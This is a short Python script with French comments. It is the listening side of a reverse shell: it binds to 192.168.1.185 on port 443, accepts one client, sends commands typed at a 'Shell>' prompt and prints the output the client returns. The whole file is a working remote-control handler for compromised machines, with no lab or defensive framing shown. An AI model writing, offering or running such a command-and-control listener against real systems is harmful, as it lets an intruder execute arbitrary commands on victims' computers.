import socket

END_RESULT = "<end-of-result>"

# Création du socket serveur
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_ip = "192.168.1.185"
server_port = 443

server_socket.bind((server_ip, server_port))
server_socket.listen(10)

print(f"[*] Serveur en écoute sur {server_ip}:{server_port}...")

# Attente d'une connexion
client_socket, client_address = server_socket.accept()

print(f"[+] Client connecté : {client_address}")

try:
    while True:
        command = input("Shell> ")

        if command == "":
            continue

        # Envoi de la commande au client
        client_socket.send(command.encode())

        # Quitter
        if command.lower() == "q":
            break

        # Réception de la réponse
        full_result = b""

        while True:
            chunk = client_socket.recv(1024)

            if not chunk:
                print("[!] Client déconnecté.")
                break

            if chunk.endswith(END_RESULT.encode()):
                chunk = chunk[:-len(END_RESULT)]
                full_result += chunk
                break

            full_result += chunk

        print(full_result.decode(errors="ignore"))

except KeyboardInterrupt:
    print("\n[!] Arrêt du serveur.")

except Exception as e:
    print(f"[ERREUR] {e}")

finally:
    client_socket.close()
    server_socket.close()
    print("[*] Connexion fermée.")
